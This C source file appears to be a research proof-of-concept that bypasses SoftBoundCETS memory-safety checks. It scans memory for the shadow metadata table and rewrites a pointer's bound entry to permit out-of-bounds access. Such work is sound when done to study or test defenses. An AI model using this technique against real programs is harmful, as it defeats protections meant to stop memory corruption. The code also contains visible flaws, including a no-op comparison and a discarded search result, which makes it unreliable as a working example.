#include "uninstr.h"
#include <stdlib.h>
#include <stdio.h>
#include <setjmp.h>
#include <signal.h>

typedef struct {
    void *base;
    void *bound;
    size_t key;
    size_t *lock;
} __shadow_softboundcets_metadata_t;

static __shadow_softboundcets_metadata_t** PRIMARY_TRIE_TABLE = 0x7FFFD3C00000;

void log_metadata_changes(__shadow_softboundcets_metadata_t *entry, int after_attack)
{
    char *msg;
    if (after_attack)
    {
        msg = "New";
    } else
    {
        msg = "Original";
    }

    printf("%s entry provides the following privilege:\
        \n    base : %p\
        \n    bound : %p\
        \n    ( total of %d bytes )\
        \n\n",
        msg,
        entry->base,
        entry->bound, 
        entry->bound - entry->base
    );
}

__shadow_softboundcets_metadata_t** find_metadata_table_start()
{
    char *primary_trie_table_candidate;
    for (int i = 0; i < 0xfffff; i++)
    {
        primary_trie_table_candidate = 0x7f0000000000 | (i << 20);
        printf("on %p\n", primary_trie_table_candidate);


        

        int candidate_valid = 1;
        for (int j = 0; j < 6; j++)
        {  
            if ((j == 0 || j == 1) && (*(primary_trie_table_candidate + j) != 0x0))
            {
                candidate_valid = 0;
            }
            else if ((j == 5) && (*(primary_trie_table_candidate + j) != 0xff))
            {  
               candidate_valid = 0; 
            }
        }

        if (candidate_valid)
        {
            break;
        }
        else {
            primary_trie_table_candidate == 0xffffffffffff;
        }
    }

    printf("candidate : %p\n", primary_trie_table_candidate);
    return (__shadow_softboundcets_metadata_t **) primary_trie_table_candidate;
}


void overwrite_metadata_map(void *addr_of_ptr, int array_len)
{
    find_metadata_table_start();

    int *m = (int *)malloc(6 * sizeof(int));
    printf("malloc'd location at %p\n", m);

    // printf("primary metadata table located at %p\n", PRIMARY_TRIE_TABLE);


    // get entry for `addr_of_ptr` from metadata table
    size_t ptr = (size_t)addr_of_ptr;
    size_t primary_index = (ptr >> 25);
    __shadow_softboundcets_metadata_t *secondary_trie_table = *(PRIMARY_TRIE_TABLE + primary_index);
    size_t secondary_index = ((ptr >> 3) & 0x3fffff);
    __shadow_softboundcets_metadata_t *entry = &(*(secondary_trie_table + secondary_index));

    // printf("secondary metadata table located at %p\n", secondary_trie_table);
    // log original privilege
    log_metadata_changes(entry, 0);

    // extend privilege by just 4 bytes
    entry->bound = entry->base + ((array_len + 1) * sizeof(int));

    // log modified privilege
    log_metadata_changes(entry, 1);
}

